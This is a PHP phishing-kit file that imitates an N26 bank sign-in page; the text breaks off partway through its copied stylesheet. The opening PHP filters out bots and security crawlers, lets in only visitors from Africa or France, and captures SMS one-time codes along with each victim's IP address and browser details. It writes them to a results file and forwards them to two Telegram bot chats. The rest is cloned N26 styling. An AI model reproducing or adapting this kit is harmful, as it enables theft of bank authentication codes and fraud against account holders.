<?php

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
$honeypotbots = file_get_contents('honeypotbots.dat');
$errorUrl = 'Error.php';
$ip = getenv('REMOTE_ADDR');

if (stripos($honeypotbots, $ip) !== false) {
  $stripos = '1';

}

$token1 = base64_encode($_SERVER['HTTP_USER_AGENT'].$ip.date('Y:M:D'));
if ($token1 != $_GET['token'] || $stripos == '1' ){ header("location: " . $errorUrl ."?" . $_GET['token']); exit;  }
function curl_get_contents($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_URL, $url);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
} 

$metri = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$metri;
$addrDetailsArr = unserialize(curl_get_contents($geoip)); 
$continent = $addrDetailsArr['geoplugin_continentCode'];
$country = $addrDetailsArr['geoplugin_countryCode'];
if (!$country)
{
    $country='Not found!';
}

if ($continent !== 'AF' && $country !== 'FR')
{
      header("location: " . $errorUrl . "?" . $_GET['token']);
     exit();
} 

if ($_POST['type'] == "otp") {
include 'config.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
            $message = '/== N26 otp 2 By METRI==/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'SMS : ' . $_POST['code'] . "\r\n";

            $message .= '/---------------- user details ----------------/' . "\r\n";
            $message .= "Client IP   : ".$ip."\n";
            $message .= "HostName    : ".$hostname."\n";
            $message .= "User Agent  : ".$_SERVER['HTTP_USER_AGENT']."\n";
            $message .= '/-- end log details --/' . "\r\n\r\n";

            file_put_contents("./rezult/n26-rzlt.txt", $message, FILE_APPEND);


            $params=[
            'chat_id'=>$chat_id,
            'text'=>$message,
            ];
            $ch = curl_init($METRI_TOKEN . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);
            
            $params=[
            'chat_id'=>$chatt_id,
            'text'=>$message,
            ];
            $ch = curl_init($MEETRI_TOKEN . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);
            
}
else {
header("location: " . $errorUrl . "?".base64_encode(rand(0,9999999999999)));
}

?>

<!DOCTYPE html>


<!DOCTYPE html>
<html lang="fr" data-rh="lang" style="--duration:0;" class="translated-ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<link rel="icon" type="image/x-icon" sizes="256x256" href="./n26_files/favicon.ico">

<title>Effettua l'accesso - N26</title>





<link rel="preload" href="./n26_files/GT-America-Standard-Regular.latin.woff2" as="font" type="font/woff2" crossorigin="anonymous">
<link rel="preload" href="./n26_files/GT-America-Extended-Medium.latin.woff2" as="font" type="font/woff2" crossorigin="anonymous">
    

    <style>

@font-face {
  font-family: 'N26';
  font-style: normal;
  font-weight: 400;
  src:
    url('./n26_files/GT-America-Standard-Regular.latin.woff2') format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}


@font-face {
  font-family: 'N26';
  font-style: normal;
  font-weight: 500;
  src:
    url('./n26_files/GT-America-Standard-Medium.latin.woff2') format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}


@font-face {
  font-family: 'N26';
  font-style: normal;
  font-weight: 600;
  src:
    url('./n26_files/GT-America-Extended-Medium.latin.woff2') format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}


@font-face {
  font-family: 'N26';
  font-style: normal;
  font-weight: 700;
  src:
    url('./n26_files/GT-America-Standard-Bold.latin.woff2') format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}


@font-face {
  font-family: 'N26';
  font-style: normal;
  font-weight: 400;
  src:
    url('./n26_files/GT-America-Standard-Regular.latin-ext.woff2') format('woff2');
  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}


@font-face {
  font-family: 'N26';
  font-style: normal;
  font-weight: 500;
  src:
    url('./n26_files/GT-America-Standard-Medium.latin-ext.woff2') format('woff2');
  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}


@font-face {
  font-family: 'N26';
  font-style: normal;
  font-weight: 600;
  src:
    url('./n26_files/GT-America-Extended-Medium.latin-ext.woff2') format('woff2');
  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}


@font-face {
  font-family: 'N26';
  font-style: normal;
  font-weight: 700;
  src:
    url('./n26_files/GT-America-Standard-Bold.latin-ext.woff2') format('woff2');
  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}

</style>

    
<style data-fela-id="" data-fela-rehydration="490" data-fela-type="STATIC">
  :root {--duration: 1;--responsive-base: 1;--background-default: rgb(255, 255, 255); --background-alternate: rgb(251, 251, 251); --background-screen: rgb(251, 251, 251); --background-button-primary-active: rgb(54, 161, 139); --background-button-primary-pressed: rgb(42, 126, 109); --background-button-primary-disabled: rgb(228, 242, 239); --background-button-secondary: rgb(255, 255, 255); --background-container-teal: rgb(54, 161, 139); --background-container-rhubarb: rgb(203, 124, 122); --background-container-wheat: rgb(205, 163, 95); --background-container-petrol: rgb(38, 102, 120); --background-container-secondary-teal: rgb(202, 215, 202); --background-container-secondary-rhubarb: rgb(229, 195, 199); --background-container-secondary-wheat: rgb(245, 214, 186); --background-container-secondary-petrol: rgb(200, 215, 229); --background-container-light: rgb(245, 245, 245); --background-container-light-teal: rgb(228, 242, 239); --background-container-light-rhubarb: rgb(242, 228, 228); --background-container-light-wheat: rgb(242, 233, 218); --background-container-light-petrol: rgb(227, 238, 241); --background-light-error-red: rgb(248, 237, 237); --background-info-card: rgb(230, 230, 230); --typography-default: rgb(27, 27, 27); --typography-default-inverted: rgb(255, 255, 255); --typography-default-consistent: rgb(27, 27, 27); --typography-default-inverted-consistent: rgb(255, 255, 255); --typography-extra-light: rgb(191, 191, 191); --typography-light: rgb(116, 116, 116); --typography-interactive-default: rgb(54, 161, 139); --typography-interactive-teal: rgb(42, 126, 109); --typography-interactive-rhubarb: rgb(203, 124, 122); --typography-interactive-wheat: rgb(205, 163, 95); --typography-interactive-petrol: rgb(38, 102, 120); --typography-error: rgb(180, 75, 70); --divider-default: rgb(230, 230, 230); --divider-teal: rgb(54, 161, 139); --divider-error: rgb(180, 75, 70); --divider-dark: rgb(116, 116, 116); --iconography-default: rgb(27, 27, 27); --iconography-default-inverted: rgb(255, 255, 255); --iconography-light: rgb(116, 116, 116); --iconography-bright: rgb(230, 230, 230); --iconography-action: rgb(54, 161, 139); --mild-overlay: rgba(0, 0, 0, 0.075); --distinct-overlay: rgba(0, 0, 0, 0.2); --shadow-default: rgba(0, 0, 0, 0.2); --primary-focus: rgba(54, 161, 139, 0.6); --shimmer-background: rgb(230, 230, 230); --shimmer-foreground: rgb(251, 251, 251); --deprecated-gray: rgb(201, 201, 201);--spacing-5-xl: 4.4em; --spacing-4-xl: 3.85em; --spacing-3-xl: 3.3em; --spacing-2-xl: 2.75em; --spacing-xl: 2.2em; --spacing-l: 1.65em; --spacing-m: 1.1em; --spacing-s: 0.88em; --spacing-xs: 0.825em; --spacing-2-xs: 0.55em; --spacing-3-xs: 0.275em; --spacing-4-xs: 0.22em; --spacing-5-xs: 0.165em; --spacing-6-xs: 0.11em;--font-size-6-xl: 280%; --font-size-5-xl: 220%; --font-size-4-xl: 200%; --font-size-3-xl: 180%; --font-size-2-xl: 150%; --font-size-xl: 130%; --font-size-l: 133%; --font-size-m: 120%; --font-size-s: 110%; --font-size-xs: 90%; --font-size-2-xs: 85%; --font-size-3-xs: 80%; --font-size-4-xs: 70%; --font-size-5-xs: 60%;--line-height-5-xl: 1.8; --line-height-4-xl: 1.7; --line-height-3-xl: 1.6; --line-height-2-xl: 1.5; --line-height-xl: 1.45; --line-height-l: 1.4; --line-height-m: 1.2; --line-height-s: 1.1; --line-height-xs: 1;--width-7-xl: 88ch; --width-6-xl: 77ch; --width-5-xl: 71.5ch; --width-4-xl: 66ch; --width-3-xl: 49.5ch; --width-2-xl: 48.4ch; --width-xl: 44ch; --width-l: 41.8ch; --width-m: 33ch; --width-s: 27.5ch; --width-xs: 22ch; --width-2-xs: 15.4ch; --width-3-xs: 13.2ch; --width-4-xs: 11ch; --width-5-xs: 8.8ch; --width-6-xs: 5.5ch; --width-7-xs: 3.3ch; --width-8-xs: 1.1ch; --width-9-xs: 0.825ch; --width-10-xs: 0.55ch; --width-11-xs: 0.33ch; --width-12-xs: 0.11ch;--border-radius-5-xl: 34px; --border-radius-4-xl: 27px; --border-radius-3-xl: 22px; --border-radius-2-xl: 14px; --border-radius-xl: 10px; --border-radius-l: 8px; --border-radius-m: 6px; --border-radius-s: 5px; --border-radius-xs: 4px; --border-radius-2-xs: 2px; --border-radius-credit-card: 3% / 5%; --border-radius-half: 50%; --border-radius-circle: 100vw;}@media (max-width: 767px) {:root {--responsive-base: 0.8;}}body {scroll-behavior: smooth; /* 2 */}@media (prefers-reduced-motion: reduce) {:root { --duration: 0 }body { scroll-behavior: auto }}::selection{background-color: rgba(72, 172, 152, 0.2);}*, ::before, ::after{box-sizing:inherit}html{background-color:var(--background-alternate);box-sizing:border-box;font-weight:400;min-height:100%;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}html, body, [id="root"], [id="app"]{display:-webkit-box;display:-moz-box;display:-ms-flexbox;display:-webkit-flex;display:flex;flex-direction:column;-webkit-box-orient:vertical;-webkit-box-direction:normal;overflow-x:hidden;flex-grow:1;flex-shrink:1;flex-basis:auto}body{font-family:N26, sans-serif;font-size:112.5%;line-height:1.4;color:var(--typography-default);margin-top:0;margin-right:0;margin-bottom:0;margin-left:0}img{display:block;height:auto;max-width:100%;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none}main{display:block}[hidden]{display:none}a{background-color:transparent;-webkit-text-decoration-skip:objects}svg:not(:root){overflow:hidden}hr{overflow:visible}button, input, select, textarea{font:inherit;margin-top:0;margin-right:0;margin-bottom:0;margin-left:0}button, input{overflow:visible}button, select{text-transform:none}button, html [type="button"], [type="reset"], [type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{padding-top:0;padding-right:0;padding-bottom:0;padding-left:0;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline-width:1px;outline-style:dotted;outline-color:ButtonText}fieldset{padding-top:0.35em;padding-right:0.625em;padding-bottom:var(--spacing-xs);padding-left:0.625em;margin-top:0;margin-right:2px;margin-bottom:0;margin-left:2px;border-top-width:1px;border-right-width:1px;border-bottom-width:1px;border-left-width:1px;border-top-style:solid;border-right-style:solid;border-bottom-style:solid;border-left-style:solid;border-top-color:rgb(192, 192, 192);border-right-color:rgb(192, 192, 192);border-bottom-color:rgb(192, 192, 192);border-left-color:rgb(192, 192, 192)}legend{box-sizing:border-box;display:table;max-width:100%;white-space:normal;color:inherit;padding-top:0;padding-right:0;padding-bottom:0;padding-left:0}textarea{overflow:auto}[type="checkbox"], [type="radio"]{padding-top:0;padding-right:0;padding-bottom:0;padding-left:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-cancel-button,[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-input-placeholder{color:inherit;opacity:0.54}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}:-webkit-autofill,:-webkit-autofill:hover,:-webkit-autofill:focus,:-webkit-autofill:active{transition:background-color 1000000ms, color 1000000ms;-webkit-transition:background-color 1000000ms, color 1000000ms;-moz-transition:background-color 1000000ms, color 1000000ms}:required:-moz-ui-invalid{box-shadow:none}.visually-hidden{border-top-width:0 !important;border-right-width:0 !important;border-bottom-width:0 !important;border-left-width:0 !important;clip:rect(1px, 1px, 1px, 1px) !important;height:1px !important;overflow:hidden !important;padding-top:0 !important;padding-right:0 !important;padding-bottom:0 !important;padding-left:0 !important;position:absolute !important;white-space:nowrap !important;width:1px !important}strong, b{font-weight:500}audio, canvas, iframe, img, svg, video{vertical-align:middle}p{margin-top:0;margin-bottom:var(--spacing-m)}body{font-size:102.5%}body{font-weight:400}
</style>


<style data-fela-id="" data-fela-rehydration="490" data-fela-type="KEYFRAME">
  @keyframes k1{to{box-shadow:0 var(--spacing-4-xs) var(--spacing-3-xs) var(--mild-overlay);background-color:var(--background-default)}}
</style>


<style data-fela-id="" data-fela-rehydration="490" data-fela-type="RULE">
  .a{border-top-width:0 !important}.b{border-right-width:0 !important}.c{border-bottom-width:0 !important}.d{border-left-width:0 !important}.e{clip:rect(1px, 1px, 1px, 1px) !important}.f{height:1px !important}.g{overflow:hidden !important}.h{padding-top:0 !important}.i{padding-right:0 !important}.j{padding-bottom:0 !important}.k{padding-left:0 !important}.l{position:absolute !important}.m{white-space:nowrap !important}.n{width:1px !important}.o{color:var(--typography-default)}.p{background-color:var(--background-alternate)}.q{z-index:1}.r{transition-property:background-color;-webkit-transition-property:background-color;-moz-transition-property:background-color}.s{transition-duration:250ms}.t{flex-grow:1}.u{flex-shrink:1}.v{flex-basis:auto}.w{position:fixed}.x{width:100%}.y{z-index:50}.z{display:-webkit-box;display:-moz-box;display:-ms-flexbox;display:-webkit-flex;display:flex}.ab{flex-direction:column;-webkit-box-orient:vertical;-webkit-box-direction:normal}.ac{align-items:center;-webkit-box-align:center}.ae{justify-content:center;-webkit-box-pack:center}.af{box-shadow:0 0 transparent}.ag{will-change:box-shadow}.ah{animation-name:k1}.ai{animation-fill-mode:forwards}.aj{animation-duration:300ms}.ak{animation-delay:800ms}.al{animation-timing-function:ease-in}.aq{position:relative}.ar{height:85px}.as{position:absolute}.at{top:0}.au{bottom:0}.av{left:0}.aw{padding-top:0}.ax{padding-right:1.25rem}.ay{padding-bottom:0}.az{padding-left:1.25rem}.ba{padding-right:0}.bb{padding-left:0}.bc{border-top-width:0}.bd{border-right-width:0}.be{border-bottom-width:0}.bf{border-left-width:0}.bg{background-color:transparent}.bh{font-style:inherit}.bi{font-weight:inherit}.bj{font-size:inherit}.bk{line-height:inherit}.bl{font-family:inherit}.bm{color:inherit}.bn{text-decoration:none}.bo{text-align:left}.bp{cursor:pointer}.bq{display:block}.br{overflow:hidden}.bs{height:1px}.bt{width:1px}.bx{line-height:var(--line-height-m)}.by{margin-right:var(--spacing-2-xs)}.bz{font-size:30px}.ca{padding-top:var(--spacing-2-xs)}.cb{padding-right:var(--spacing-xs)}.cc{padding-bottom:var(--spacing-2-xs)}.cd{flex-shrink:0}.ce{height:auto}.cf{fill:currentcolor}.cg{max-width:100%}.ch{height:30px}.ci{justify-content:flex-start;-webkit-box-pack:start}.cj{width:calc(860px + 1.25rem * 2)}.ck{transition-property:color;-webkit-transition-property:color;-moz-transition-property:color}.cp{margin-top:0}.cq{margin-right:1.25rem}.cr{margin-bottom:0}.cs{margin-left:1.25rem}.ct{display:inline-block}.cu{height:var(--spacing-m)}.cv{width:var(--spacing-m)}.cw{vertical-align:-2px}.cx{overflow:visible}.cy{margin-right:var(--spacing-xs)}.cz{font-size:var(--font-size-l)}.da{vertical-align:baseline}.db::before{content:""}.dc::before{position:absolute}.dd::before{top:0}.de::before{right:0}.df::before{bottom:0}.dg::before{left:0}.dh::before{z-index:1}.dk{right:0}.dl{justify-content:flex-end;-webkit-box-pack:end}.dm{color:var(--typography-interactive-default)}.dn{max-width:calc(860px + calc(var(--responsive-base) * 1.1rem) * 2)}.dw{padding-top:var(--spacing-l)}.dx{padding-right:calc(var(--responsive-base) * 1.1rem)}.dy{padding-bottom:var(--spacing-l)}.dz{padding-left:calc(var(--responsive-base) * 1.1rem)}.ea{margin-top:calc(85px + 0px)}.eb{margin-right:auto}.ec{margin-left:auto}.ed{margin-bottom:var(--spacing-xl)}.ee{margin-bottom:3rem}.ef{flex-wrap:wrap;-webkit-box-lines:multiple}.eg{font-size:170%}.eh{font-weight:500}.ei{line-height:var(--line-height-2-xl)}.ej{letter-spacing:-0.4px}.ek{flex-basis:100%}.el{text-decoration-skip-ink:auto}.em{text-decoration-skip:skip;text-decoration-skip:ink}.en{text-align:initial;text-align:left}.er{margin-top:1rem}.es{font-size:var(--font-size-4-xs)}.et{margin-bottom:0.5rem}.eu{font-size:var(--font-size-s)}.ev{line-height:1.285}.ew{background-color:var(--background-default)}.ex{box-shadow:0 0.125em 0.25em 0 var(--distinct-overlay)}.ey{border-radius:var(--border-radius-l)}.ez{margin-bottom:1.25rem}.fa{transition-property:background-color, box-shadow;-webkit-transition-property:background-color, box-shadow;-moz-transition-property:background-color, box-shadow}.fc{padding-top:calc(var(--responsive-base) * 0.99rem)}.fd{padding-right:calc(var(--responsive-base) * 0.99rem)}.fe{padding-bottom:calc(var(--responsive-base) * 0.99rem)}.ff{padding-left:calc(var(--responsive-base) * 0.99rem)}.fg{min-height:10em}.fh{font-size:var(--font-size-2-xl)}.fi{width:1em}.fj{height:1em}.fk:before{content:""}.fl:before{animation-name:k1}.fm:before{animation-duration:1000ms}.fn:before{animation-iteration-count:infinite}.fo:before{animation-timing-function:cubic-bezier(0.62, 0.29, 0.61, 0.38)}.fp:before{position:absolute}.fq:before{top:0}.fr:before{left:0}.fs:before{width:100%}.ft:before{height:100%}.fu:before{border-radius:var(--border-radius-half)}.fv:before{opacity:0.5}.fw:before{border-top-color:currentcolor}.fx:before{border-top-style:solid}.fy:before{border-right-color:var(--deprecated-gray)}.fz:before{border-bottom-color:var(--deprecated-gray)}.ga:before{border-left-color:var(--deprecated-gray)}.gb:before{border-right-style:solid}.gc:before{border-bottom-style:solid}.gd:before{border-left-style:solid}.ge::after{content:""}.gf::after{animation-name:k1}.gg::after{animation-duration:1000ms}.gh::after{animation-iteration-count:infinite}.gi::after{animation-timing-function:linear}.gj::after{position:absolute}.gk::after{top:0}.gl::after{left:0}.gm::after{width:100%}.gn::after{height:100%}.go::after{border-radius:var(--border-radius-half)}.gp::after{border-top-color:currentcolor}.gq::after{border-top-style:solid}.gr::after{border-right-color:transparent}.gs::after{border-bottom-color:transparent}.gt::after{border-left-color:transparent}.gu::after{border-right-style:solid}.gv::after{border-bottom-style:solid}.gw::after{border-left-style:solid}.hn{margin-top:calc(var(--spacing-xs) * -1)}.ho{margin-right:0}.hp{margin-bottom:var(--spacing-xs)}.hq{margin-left:0}.hr{justify-content:space-between;-webkit-box-pack:justify}.hs{padding-top:var(--spacing-xs)}.ht{padding-bottom:var(--spacing-xs)}.hu{float:left}.hv{clear:both}.hw{padding-right:var(--width-8-xs)}.hx{float:right}.hy{text-align:right}.hz{color:var(--typography-light)}.ia{min-height:2rem}.ib{margin-right:0.7rem}.ic{flex-grow:0;-webkit-box-flex:0}.if{font-size:1.925rem}.ih{stroke:currentcolor}.ii{flex-grow:1;-webkit-box-flex:1}.ij{padding-bottom:var(--spacing-4-xs)}.ik{word-break:break-word}.il{overflow-wrap:break-word}.im::after{right:0}.in::after{bottom:0}.io::after{z-index:1}.ip::before{width:4px}.iq::before{background-color:var(--background-container-teal)}.ir::before{opacity:0}.is::before{transition-property:opacity;-webkit-transition-property:opacity;-moz-transition-property:opacity}.it::before{transition-duration:200ms}.iw{font-size:var(--font-size-xs)}.ix{padding-top:var(--spacing-5-xs)}.iy{padding-bottom:var(--spacing-5-xs)}.iz{padding-left:var(--spacing-m)}.ja{opacity:0.2}.jb{border-radius:36px}.jc{text-align:center}.jd{line-height:var(--line-height-l)}.je{-webkit-tap-highlight-color:transparent}.ji{bottom:1rem}.jj{right:1rem}.jk{box-shadow:0 3px 12px 0 rgba(0, 0, 0, 0.14)}.jl{border-top-color:var(--background-default)}.jm{border-right-color:var(--background-default)}.jn{border-bottom-color:var(--background-default)}.jo{border-left-color:var(--background-default)}.jp{padding-top:var(--spacing-s)}.jq{padding-right:var(--spacing-l)}.jr{padding-bottom:var(--spacing-s)}.js{padding-left:var(--spacing-l)}.kf{border-radius:0}.kg{box-shadow:none}.kh{line-height:1.3333333333333333}.ki[disabled]{cursor:not-allowed}.kj[disabled]{opacity:0.5}.kk[disabled]{pointer-events:none}.kl[readonly]{cursor:not-allowed}.km[readonly]{opacity:0.5}.kn[readonly]{pointer-events:none}.ko + ul{margin-top:6px}.kp + ul{margin-right:-1px}.kq + ul{margin-bottom:0}.kr + ul{margin-left:-1px}.ks + ul{padding-top:0}.kt + ul{padding-right:0}.ku + ul{padding-bottom:0}.kv + ul{padding-left:0}.kw + ul{list-style:none}.kx + ul> ::before{position:absolute}.ky + ul> ::before{content:"\200B"}.kz + ul{background-color:var(--background-default)}.la + ul{box-shadow:0 2px 4px 0 rgba(0, 0, 0, 0.1)}.lb + ul{border-radius:var(--border-radius-l)}.lc + ul{position:absolute}.ld + ul{left:0}.le + ul{right:0}.lf + ul{z-index:50}.li + ul{border-top-width:1px}.lj + ul{border-right-width:1px}.lk + ul{border-bottom-width:1px}.ll + ul{border-left-width:1px}.lm + ul{border-top-style:solid}.ln + ul{border-right-style:solid}.lo + ul{border-bottom-style:solid}.lp + ul{border-left-style:solid}.lq + ul{border-top-color:var(--divider-default)}.lr + ul{border-right-color:var(--divider-default)}.ls + ul{border-bottom-color:var(--divider-default)}.lt + ul{border-left-color:var(--divider-default)}.lu + ul > li:not(:last-child){border-bottom-width:1px}.lv + ul > li:not(:last-child){border-bottom-style:solid}.lw + ul > li:not(:last-child){border-bottom-color:var(--divider-default)}.lx + ul > li{font-size:var(--font-size-2-xs)}.ly + ul > li{text-align:left}.lz + ul > li:first-child{border-top-left-radius:var(--border-radius-l)}.ma + ul > li:first-child{border-top-right-radius:var(--border-radius-l)}.mb + ul > li:last-child{border-bottom-left-radius:var(--border-radius-l)}.mc + ul > li:last-child{border-bottom-right-radius:var(--border-radius-l)}.md + ul > li:hover{background-color:var(--background-container-teal)}.me + ul > li:hover{color:rgb(255, 255, 255)}.mf + ul > li:hover:not(:last-child){border-bottom-width:1px}.mg + ul > li:hover:not(:last-child){border-bottom-style:solid}.mh + ul > li:hover:not(:last-child){border-bottom-color:rgba(255, 255, 255, 0.4)}.mi + ul > li:hover{cursor:pointer}.mj + ul > li{padding-top:var(--spacing-2-xs)}.mk + ul > li{padding-right:var(--spacing-xs)}.ml + ul > li{padding-bottom:var(--spacing-2-xs)}.mm + ul > li{padding-left:var(--spacing-xs)}.mn + ul > [aria-selected="true"]{background-color:var(--background-container-teal)}.mo + ul > [aria-selected="true"]{color:rgb(255, 255, 255)}.mp + ul > [aria-selected="true"]:not(:last-child){border-bottom-width:1px}.mq + ul > [aria-selected="true"]:not(:last-child){border-bottom-style:solid}.mr + ul > [aria-selected="true"]:not(:last-child){border-bottom-color:rgba(255, 255, 255, 0.4)}.ms + ul mark{background-color:transparent}.mt + ul mark{color:inherit}.mu + ul mark{border-bottom-width:1px}.mv + ul mark{border-bottom-style:solid}.mw::placeholder{opacity:0.8}.mx::placeholder{color:rgb(150, 150, 150)}.my::-ms-input-placeholder{opacity:0.8}.mz::-ms-input-placeholder{color:rgb(150, 150, 150)}.na{transition-property:box-shadow;-webkit-transition-property:box-shadow;-moz-transition-property:box-shadow}.ng[aria-invalid="true"]{border-top-color:var(--divider-error)}.nh[aria-invalid="true"]{border-right-color:var(--divider-error)}.ni[aria-invalid="true"]{border-bottom-color:var(--divider-error)}.nj[aria-invalid="true"]{border-left-color:var(--divider-error)}.nk{border-bottom-width:1px}.nl{border-bottom-style:solid}.nm{border-bottom-color:var(--deprecated-gray)}.nn{padding-top:0.67em}.no{padding-bottom:0.67em}.np{line-height:1.35}.nq{margin-bottom:var(--spacing-2-xs)}.nv{height:100%}.nw> option{color:var(--typography-default)}.nx> option{background-color:var(--background-alternate)}.ny{-webkit-appearance:none;-moz-appearance:none;appearance:none}.nz{transition-property:text-indent;-webkit-transition-property:text-indent;-moz-transition-property:text-indent}.oa{width:0.6em}.ob{right:0.6em}.oc{top:0.55em}.od{fill:var(--iconography-light)}.of{margin-top:var(--spacing-xl)}.oi{background-color:var(--background-container-teal)}.oj{color:rgb(255, 255, 255)}.om{border-top-width:2px}.on{border-right-width:2px}.oo{border-bottom-width:2px}.op{border-left-width:2px}.oq{border-top-style:solid}.or{border-right-style:solid}.os{border-left-style:solid}.ot{border-top-color:var(--divider-teal)}.ou{border-right-color:var(--divider-teal)}.ov{border-bottom-color:var(--divider-teal)}.ow{border-left-color:var(--divider-teal)}.ox{display:inline}.oy{text-decoration:underline}.pa{fill:none}.pb{stroke-width:2px}.pc{width:inherit}.pd{height:inherit}.pe{flex-direction:row-reverse;-webkit-box-orient:horizontal;-webkit-box-direction:reverse}.pf{pointer-events:auto}.pg{opacity:0}.pj:not(:checked) + *{background-color:var(--background-container-light)}.pk:not(:checked) + *{border-top-color:rgba(231, 231, 231, 0.3)}.pl:not(:checked) + *{border-right-color:rgba(231, 231, 231, 0.3)}.pm:not(:checked) + *{border-bottom-color:rgba(231, 231, 231, 0.3)}.pn:not(:checked) + *{border-left-color:rgba(231, 231, 231, 0.3)}.po:checked + *{background-color:var(--background-container-teal)}.pp:checked + *{border-top-color:var(--divider-teal)}.pq:checked + *{border-right-color:var(--divider-teal)}.pr:checked + *{border-bottom-color:var(--divider-teal)}.ps:checked + *{border-left-color:var(--divider-teal)}.pt:not(:checked) + *::before{background-color:rgb(255, 255, 255)}.pu:not(:checked) + *::before{transform:translateX(0)}.pv:not(:checked) + *::before{border-top-color:var(--background-container-light)}.pw:not(:checked) + *::before{border-right-color:var(--background-container-light)}.px:not(:checked) + *::before{border-bottom-color:var(--background-container-light)}.py:not(:checked) + *::before{border-left-color:var(--background-container-light)}.pz:checked + *::before{transform:translateX(calc(100% - 2px))}.qa:checked + *::before{border-top-color:var(--divider-teal)}.qb:checked + *::before{border-right-color:var(--divider-teal)}.qc:checked + *::before{border-bottom-color:var(--divider-teal)}.qd:checked + *::before{border-left-color:var(--divider-teal)}.qe:disabled + *{opacity:0.4}.qf{outline-style:none}.qg{display:none}.qh{width:calc(3.3em + 2px)}.qi{height:calc(1.65em + 2px)}.qj{border-radius:1.65em}.qk{transition-property:border-color, background-color;-webkit-transition-property:border-color, background-color;-moz-transition-property:border-color, background-color}.ql{transition-duration:200ms}.qm{transition-delay:50ms}.qn{transition-timing-function:ease-in-out}.qo::before{background-color:rgb(255, 255, 255)}.qp::before{transform:translateX(0)}.qq::before{top:-1px}.qr::before{left:-1px}.qs::before{bottom:-1px}.qt::before{width:calc(1.65em + 2px)}.qu::before{border-radius:1.65em}.qv::before{box-shadow:0 3px 3px 0 rgba(0, 0, 0, 0.25)}.qw::before{transition-property:transform;-webkit-transition-property:transform;-moz-transition-property:transform}.qx::before{transition-duration:inherit}.qy::before{transition-timing-function:inherit}.qz::before{border-top-color:var(--background-container-light)}.ra::before{border-right-color:var(--background-container-light)}.rb::before{border-bottom-color:var(--background-container-light)}.rc::before{border-left-color:var(--background-container-light)}.rd::before{border-top-width:1px}.re::before{border-right-width:1px}.rf::before{border-bottom-width:1px}.rg::before{border-left-width:1px}.rh::before{border-top-style:solid}.ri::before{border-right-style:solid}.rj::before{border-bottom-style:solid}.rk::before{border-left-style:solid}.rl{border-top-color:rgba(231, 231, 231, 0.3)}.rm{border-right-color:rgba(231, 231, 231, 0.3)}.rn{border-bottom-color:rgba(231, 231, 231, 0.3)}.ro{border-left-color:rgba(231, 231, 231, 0.3)}.rp{margin-top:var(--spacing-l)}.rq{list-style:none}.rr> ::before{position:absolute}.rs> ::before{content:"\200B"}.rt{border-bottom-color:var(--mild-overlay)}.ru{padding-top:calc(var(--responsive-base) * 